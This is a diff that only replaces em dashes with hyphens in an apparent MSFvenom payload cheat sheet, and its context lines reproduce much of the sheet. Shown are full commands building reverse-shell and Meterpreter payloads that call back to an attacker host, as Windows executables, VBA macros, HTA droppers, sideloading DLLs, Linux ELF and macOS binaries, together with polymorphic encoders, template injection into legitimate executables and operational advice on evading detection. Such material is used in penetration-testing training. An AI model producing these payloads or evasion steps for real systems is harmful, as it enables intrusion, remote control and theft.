@@ -25,7 +25,7 @@ MSFvenom produces two fundamental payload categories. Choosing correctly impacts
 
 ## Discovery & Reconnaissance Commands
 
-Before generating any payload, enumerate what's available. Metasploit updates frequently — always check your local installation.
+Before generating any payload, enumerate what's available. Metasploit updates frequently - always check your local installation.
 
 ```bash
 # Payload enumeration
@@ -74,8 +74,8 @@ MSFvenom payload names follow a predictable structure. Understanding it helps yo
 
 **Naming Gotchas**:
 
-- Staged: `meterpreter/reverse_tcp` — note the **slash** between payload and transport
-- Stageless: `meterpreter_reverse_tcp` — note the **underscore** replacing the slash
+- Staged: `meterpreter/reverse_tcp` - note the **slash** between payload and transport
+- Stageless: `meterpreter_reverse_tcp` - note the **underscore** replacing the slash
 - `reverse` = callback to attacker; `bind` = listener opens on target
 
 ---
@@ -117,7 +117,7 @@ msfvenom -p windows/meterpreter/reverse_http \
   HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
   -f exe -o rev_http.exe
 
-# HTTPS transport — strongly preferred for production
+# HTTPS transport - strongly preferred for production
 msfvenom -p windows/x64/meterpreter_reverse_https \
   LHOST=cdn.example.com LPORT=8443 \
   HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
@@ -169,7 +169,7 @@ msfvenom -p windows/x64/meterpreter_reverse_https \
   LHOST=10.10.10.10 LPORT=8443 \
   -f vba -o macro.vba
 
-# HTA (HTML Application) — double-click executes via update.exe
+# HTA (HTML Application) - double-click executes via update.exe
 msfvenom -p windows/x64/meterpreter_reverse_https \
   LHOST=10.10.10.10 LPORT=8443 \
   -f hta-psh -o drop.hta
@@ -183,7 +183,7 @@ msfvenom -p windows/x64/meterpreter_reverse_https \
 ### DLL Outputs (for Sideloading / Hijacking)
 
 ```bash
-# x86 DLL — inject with: rundll32.exe x86.dll,Control_RunDLL
+# x86 DLL - inject with: rundll32.exe x86.dll,Control_RunDLL
 msfvenom -p windows/x86/meterpreter/reverse_tcp \
   LHOST=10.10.10.10 LPORT=4444 \
   -f dll -o payload_x86.dll
@@ -249,7 +249,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp \
   LHOST=10.10.10.10 LPORT=4444 \
   -f elf -o lin_x64_staged.elf
 
-# x64 stageless — preferred
+# x64 stageless - preferred
 msfvenom -p linux/x64/meterpreter_reverse_tcp \
   LHOST=10.10.10.10 LPORT=4444 \
   -f elf -o lin_x64_stageless.elf
@@ -280,7 +280,7 @@ msfvenom -p linux/x86/shell_reverse_tcp \
   LHOST=10.10.10.10 LPORT=4444 \
   -f elf -o shell_x86.elf
 
-# Find-gadget reverse shell (uses /bin/sh — tiny)
+# Find-gadget reverse shell (uses /bin/sh - tiny)
 msfvenom -p linux/x86/shell/find_tag \
   LHOST=10.10.10.10 LPORT=4444 \
   -f elf -o shell_find.elf
@@ -334,7 +334,7 @@ msfvenom -p osx/x64/meterpreter_reverse_tcp \
   LHOST=10.10.10.10 LPORT=4444 \
   -f macho -o macos_met_tcp.macho
 
-# x64 Meterpreter reverse HTTPS — preferred for ops
+# x64 Meterpreter reverse HTTPS - preferred for ops
 msfvenom -p osx/x64/meterpreter_reverse_https \
   LHOST=10.10.10.10 LPORT=8443 \
   -f macho -o macos_met_https.macho
@@ -472,7 +472,7 @@ msfvenom -p java/jsp_shell_reverse_tcp \
 
 ## Scripting & Interpreter Payloads
 
-These generate code for interpreted languages — useful when you have code execution but can't drop binaries.
+These generate code for interpreted languages - useful when you have code execution but can't drop binaries.
 
 ```bash
 # Shell & Command payloads
@@ -545,7 +545,7 @@ Encoding helps with **bad-character avoidance** and **minor signature obfuscatio
 msfvenom -l encoders
 
 # Notable encoders by architecture:
-# x86: x86/shikata_ga_nai (polymorphic XOR) — changes signature each iteration
+# x86: x86/shikata_ga_nai (polymorphic XOR) - changes signature each iteration
 # x86: x86/xor_dynamic, x86/context_stat, x86/call4_dword_xor
 # x64: x64/xor_dynamic, x64/xor
 # All: cmd/powershell_base64, cmd/echo, cmd/brace
@@ -685,7 +685,7 @@ msfvenom -p windows/x64/meterpreter_reverse_https \
 | Flag        | Behavior                                                                                       |
 | ----------- | ---------------------------------------------------------------------------------------------- |
 | `-x <file>` | Use `<file>` as the executable template                                                        |
-| `-k`        | **Keep template functionality** — payload runs in a new thread; original exe executes normally |
+| `-k`        | **Keep template functionality** - payload runs in a new thread; original exe executes normally |
 | (no `-k`)   | Payload replaces the entry point; original program does **not** run                            |
 
 > **Operational note**: Signed binaries lose their signature after template injection. The file will show as unsigned, which can trigger SmartScreen/AppLocker.
@@ -754,7 +754,7 @@ msfvenom -p windows/x64/meterpreter_reverse_https \
   EXITFUNC=process \
   -f raw -o sc_process.bin
 
-# Exit function: seh (uses Structured Exception Handler — for exploits)
+# Exit function: seh (uses Structured Exception Handler - for exploits)
 msfvenom -p windows/x64/meterpreter_reverse_https \
   LHOST=10.10.10.10 LPORT=8443 \
   EXITFUNC=seh \
@@ -897,7 +897,7 @@ msfvenom -p windows/x64/meterpreter_reverse_https \
 
 ---
 
-## Staged vs Stageless — When to Use Which
+## Staged vs Stageless - When to Use Which
 
 | Factor                   | Staged                                                         | Stageless                                       |
 | ------------------------ | -------------------------------------------------------------- | ----------------------------------------------- |
@@ -1017,7 +1017,7 @@ msfvenom --list formats
 | ----------------------------- | ---------------------------------------------------------------------- |
 | LHOST reachable?              | `nc -zv <LHOST> <LPORT>` from target network                           |
 | Firewall on target?           | `netsh advfirewall firewall` or `iptables -L`                          |
-| Handler running?              | `msf6 > jobs` — handler should show as active                          |
+| Handler running?              | `msf6 > jobs` - handler should show as active                          |
 | Payload matches handler?      | Check PAYLOAD name character-for-character                             |
 | Staged vs Stageless mismatch? | Staged payload needs staged handler; stageless needs stageless handler |
 | HTTPS cert issues?            | Try with `StagerVerifySSLCert false` first                             |
@@ -1105,9 +1105,9 @@ xxd payload.exe | head -20
 
 ## Sources & Further Reading
 
-- **Metasploit Unleashed** — Free Metasploit course: https://www.offensive-security.com/metasploit-unleashed/
-- **MSFvenom Official Documentation** — https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
-- **Metasploit Payloads Reference** — https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
-- **LOLBAS Project** — Living Off The Land binaries: https://lolbas-project.github.io/
-- **PayloadsAllTheThings** — Comprehensive payload collection: https://github.com/swisskyrepo/PayloadsAllTheThings
-- **Staged vs Stageless Deep Dive** — https://docs.metasploit.com/docs/using-metasploit/basics/understanding-payloads.html
+- **Metasploit Unleashed** - Free Metasploit course: https://www.offensive-security.com/metasploit-unleashed/
+- **MSFvenom Official Documentation** - https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
+- **Metasploit Payloads Reference** - https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
+- **LOLBAS Project** - Living Off The Land binaries: https://lolbas-project.github.io/
+- **PayloadsAllTheThings** - Comprehensive payload collection: https://github.com/swisskyrepo/PayloadsAllTheThings
+- **Staged vs Stageless Deep Dive** - https://docs.metasploit.com/docs/using-metasploit/basics/understanding-payloads.html
